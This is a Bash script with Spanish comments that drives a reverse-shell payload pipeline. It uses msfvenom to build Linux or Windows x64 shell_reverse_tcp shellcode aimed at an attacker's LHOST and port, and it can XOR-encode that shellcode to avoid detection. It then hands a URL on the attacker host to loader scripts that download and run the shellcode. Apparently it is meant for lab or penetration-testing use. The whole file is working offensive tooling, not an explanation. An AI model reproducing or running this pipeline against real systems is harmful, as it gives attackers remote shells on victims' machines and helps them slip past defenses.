#!/bin/bash

# === main.sh ===
# Uso:
#   ./main.sh <OS> <LHOST> [LPORT] [xor] [KEY]
# Ejemplos:
#   ./main.sh linux 10.10.14.11 5555
#   ./main.sh windows 10.10.14.11 4444 xor 0x42

set -euo pipefail

# Valores por defecto
LPORT_DEFAULT="5555"
XOR_KEY_DEFAULT="0x42"

# Verificar al menos OS y LHOST
if [ $# -lt 2 ]; then
    echo "Uso: $0 <OS> <LHOST> [LPORT] [xor] [KEY]"
    echo "Ej:  $0 linux 10.10.14.11"
    echo "Ej:  $0 windows 10.10.14.11 4444 xor 0x42"
    exit 1
fi

OS="$1"
LHOST="$2"
LPORT="${3:-$LPORT_DEFAULT}"
XOR_MODE="false"
XOR_KEY="$XOR_KEY_DEFAULT"

# Detectar si se pasó 'xor' y opcionalmente una clave
if [[ "${#@}" -ge 4 ]] && [[ "${4,,}" == "xor" ]]; then
    XOR_MODE="true"
    if [ $# -ge 5 ]; then
        XOR_KEY="$5"
    fi
fi

# Validar OS
if [[ "$OS" != "linux" && "$OS" != "windows" ]]; then
    echo "Error: OS debe ser 'linux' o 'windows'."
    exit 1
fi

# Archivos temporales
OUTPUT_BIN="shell_${OS}.bin"
OUTPUT_ENC="shellcode_${OS}.txt"
LOADER_TEMP_DIR=".temp_loader"
LOADER_C=""
MAKEFILE_TEMP=""

# Limpiar temporal al salir
trap 'rm -rf "$LOADER_TEMP_DIR"' EXIT

echo "[*] Configuración:"
echo "    OS        = $OS"
echo "    LHOST     = $LHOST"
echo "    LPORT     = $LPORT"
echo "    XOR Mode  = $XOR_MODE"
if [[ "$XOR_MODE" == "true" ]]; then
    echo "    XOR Key   = $XOR_KEY"
fi

# === Modo con XOR: Usar gen_txt.sh (que llama a gen_xor.sh internamente) ===
if [[ "$XOR_MODE" == "true" ]]; then
    echo "[*] Generando shellcode con codificación XOR..."

    # Ejecutar gen_txt.sh (este genera el binario, lo codifica con XOR y llama a gen_loader2.sh)
    ./gen_txt.sh "$OS" "$LHOST" "$LPORT" "$OUTPUT_BIN" "$OUTPUT_ENC" "$XOR_KEY"

    # El gen_txt.sh ya ejecuta el loader, pero si queremos asegurarnos del URL correcto:
    URL="http://$LHOST/$OUTPUT_ENC"
    echo "[+] Ejecutando loader con URL: $URL"
    ./gen_loader2.sh --target "$OS" --url "$URL" --key "$XOR_KEY"

else
    # === Modo sin XOR: Usar directamente gen_loader.sh ===
    echo "[*] Generando shellcode sin XOR..."

    # Generar nombre del binario y archivo de shellcode plano (sin XOR)
    RAW_SHELLCODE="shellcode_raw_${OS}.txt"

    # Generar shellcode raw con msfvenom
    PAYLOAD=""
    case "$OS" in
        linux)
            PAYLOAD="linux/x64/shell_reverse_tcp"
            ;;
        windows)
            PAYLOAD="windows/x64/shell_reverse_tcp"
            ;;
    esac

    echo "[*] Generando payload con msfvenom..."
    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f c | tr -d '\n' > "$RAW_SHELLCODE"

    # Extraer solo los \\x..\\x.. del output de formato 'c'
    SHELLCODE_HEX=$(grep -o '"[^"]*"' "$RAW_SHELLCODE" | tr -d '"' | tr -d ' ' | sed 's/\\x/\x5c\x78/g')
    echo -n "$SHELLCODE_HEX" > "$RAW_SHELLCODE"

    URL="http://$LHOST/$RAW_SHELLCODE"
    echo "[+] Shellcode sin XOR listo en '$RAW_SHELLCODE'"
    echo "[+] Ejecutando loader sin XOR..."
    ./gen_loader.sh --target "$OS" --url "$URL"
fi

echo "[+] Proceso completado."
